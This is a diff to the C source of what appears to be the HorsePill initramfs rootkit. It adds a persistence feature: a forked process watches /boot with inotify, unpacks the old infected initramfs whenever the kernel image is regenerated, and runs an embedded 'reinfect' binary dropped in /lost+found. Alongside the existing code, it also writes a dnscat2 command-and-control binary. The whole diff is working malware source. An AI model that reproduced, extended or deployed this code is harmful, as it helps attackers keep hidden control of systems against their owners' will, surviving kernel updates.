@@ -1,6 +1,7 @@
 #include "horsepill.h"
 
 #include <sys/mount.h>
+#include <sys/inotify.h>
 #include <sys/reboot.h>
 #include <sys/wait.h>
 #include <sys/prctl.h>
@@ -18,8 +19,10 @@
 #include <dirent.h>
 
 #include "dnscat.h"
+#include "reinfect.h"
 
 #define DNSCAT_PATH	"/lost+found/dnscat"
+#define REINFECT_PATH	"/lost+found/reinfect"
 
 #ifndef MS_RELATIME
 #define MS_RELATIME     (1<<21)
@@ -360,6 +363,64 @@ static void on_sigint(int signum)
 		kill(init_pid, SIGINT);
 }
 
+int hook_update_initramfs() 
+{
+	int length, i;
+	int fd;
+	int wd;
+	pid_t pid;
+	char buffer[1024 * (sizeof(struct inotify_event) + 16)];
+	char command[1024];
+	struct utsname info_os;
+	
+	pid = fork();
+	if (pid < 0)
+		return 0;
+
+	if (pid == 0) {
+		fd = inotify_init();
+		if (fd < 0)
+			return 0; // error in installation of inotify_init
+		
+		wd = inotify_add_watch(fd, "/boot/", IN_MODIFY | IN_CREATE | IN_DELETE | IN_MOVE);
+		
+		while (1) {
+			length = read(fd, buffer, 1024 * (sizeof(struct inotify_event) + 16));
+			i = 0;
+
+			while (i < length) {
+				struct inotify_event *event = (struct inotify_event *) &buffer[i];
+				if (event->len && (event->mask & IN_MOVED_FROM)) {
+					if (strcmp(event->name,"initrd.img-5.13.0-40-generic.new")==0) {
+						system("mkdir /lost+found/old-initramfs/");
+
+						// unpack old initramfs to save infected run-init
+						sprintf(command, "unmkinitramfs /boot/initrd.img-5.13.0-40-generic /lost+found/old-initramfs");
+						system(command);
+					}
+				} else  if (event->len && (event->mask & IN_MOVED_TO)) {
+					if (strcmp(event->name,"initrd.img-5.13.0-40-generic")==0) {
+						char *argv[2];
+						memset((void*)argv, 0, sizeof(argv));
+						
+						// fill command line argument to reinfect script
+						argv[0] = "/boot/initrd.img-5.13.0-40-generic";
+
+						// launch script to reinfect
+						execv(REINFECT_PATH, argv);
+					}
+				}
+				i += sizeof(struct inotify_event) + event->len;
+			}
+		}
+
+		inotify_rm_watch(fd, wd);
+		close(fd);
+	}
+
+	return 1;
+}
+
 /**
  * This function is entry point just prior to running init
  **/
@@ -393,6 +454,12 @@ void perform_hacks()
 		// remount root
 		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME, "errors=remount-ro,data=ordered") < 0)
 			exit(EXIT_FAILURE);
+
+		// write executable of reinfect
+		write_executable(REINFECT_PATH, reinfect, reinfect_len);
+
+		// spawn a process to hook updates
+		hook_update_initramfs();
 
 		// write executable of dnscat2
 		write_executable(DNSCAT_PATH, dnscat, dnscat_len);
